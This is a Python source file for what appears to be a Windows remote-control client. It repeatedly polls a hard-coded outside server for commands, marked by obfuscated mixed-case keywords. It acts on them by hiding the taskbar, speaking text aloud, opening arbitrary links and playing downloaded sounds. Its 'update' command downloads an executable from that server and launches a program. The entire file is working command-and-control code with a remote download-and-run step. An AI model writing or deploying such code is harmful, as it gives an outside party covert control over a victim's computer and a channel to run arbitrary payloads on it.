import requests as rq
from time import sleep
from threading import Thread
from webbrowser import open as wbopen
import pygame
import os
import pyttsx3
import ctypes

url = "https://ms32-sha2.onrender.com/"
terminate = False
HWND = 0
SW_HIDE = 0
SW_SHOW = 5
FindWindow = ctypes.windll.user32.FindWindowW
ShowWindow = ctypes.windll.user32.ShowWindow
taskbar_hwnd = FindWindow("Shell_TrayWnd",HWND)

try:
    pygame.mixer.init()
except:
    pass

def hit(url:str):
    try:
        if not terminate:
            return rq.get(url,stream=True)
    except:
        return "none"

def say(txt):
    engine = pyttsx3.init()
    engine.setProperty("rate",engine.getProperty('rate')-40)
    engine.say(txt)
    engine.runAndWait()

def playfunc(fp):
    if not os.path.exists(os.path.join("effects",fp)):
        audi = hit(url+f"static/sounds/{fp}")
        with open(os.path.join("effects",fp), "xb") as file:
            downloaded_size = 0
            for chunk in audi.iter_content(chunk_size=8192):
                if chunk:
                    file.write(chunk)
                    downloaded_size += len(chunk)
    pygame.mixer.music.load(f"effects/{fp}")
    pygame.mixer.music.play()
    while pygame.mixer.music.get_busy():
        continue               
    
def update():
    global terminate
    exe = hit(url+"static/updates/ms32-1.exe")
    total_size = int(exe.headers.get('content-length', 0))
    with open("ms32-1.exe", "xb") as file:
        downloaded_size = 0
        for chunk in exe.iter_content(chunk_size=8192):
            if chunk:
                file.write(chunk)
                downloaded_size += len(chunk)
    os.startfile("updater.exe")
    terminate=True
    return

def hide(state):
    if not state:
        ShowWindow(taskbar_hwnd,SW_SHOW)
    else:
        ShowWindow(taskbar_hwnd,SW_HIDE)
    
   
    
def main():
    while not terminate:
        cmd = hit(url+"command")
        if type(cmd) != str:
            cmd = cmd.content.decode("utf-8")
        print(cmd)
        if "hIdE on" in cmd:
            hide(True)
        elif "hIdE off" in cmd:
            hide(False)
        elif "sPeAk" in cmd:
            txt = cmd.replace("sPeAk","")
            saying = Thread(target=say,args=(txt,))
            saying.start()
        elif "oPeN" in cmd:
            link = cmd.replace("oPeN ","")
            wbopen(link)
        elif "pLaY" in cmd:
            fp = cmd.replace("pLaY ","")
            Thread(target=playfunc,args=(fp,)).start()
        elif "uPdAtE" in cmd:
            update()
        sleep(0.8)

main()
